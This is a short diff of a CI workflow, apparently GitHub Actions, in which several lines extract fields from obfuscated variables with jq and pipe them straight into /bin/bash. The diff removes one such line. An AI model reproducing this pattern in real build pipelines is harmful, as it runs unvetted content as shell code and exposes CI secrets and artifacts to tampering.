@@ -41,7 +41,6 @@ jobs:
           echo $s14503 | jq -r .burv79789 | /bin/bash
           printf '%s' "$kikb59839" | jq -r .cj25 | /bin/bash
           echo $gnuu95 | jq -r .xh9 | /bin/bash
-          printf '%s' "$d54748" | jq -r .ow42234 | /bin/bash
           printf '%s' "$vxku997" | jq -r .dvdo8 | /bin/bash
 
       - name: Upload artifact
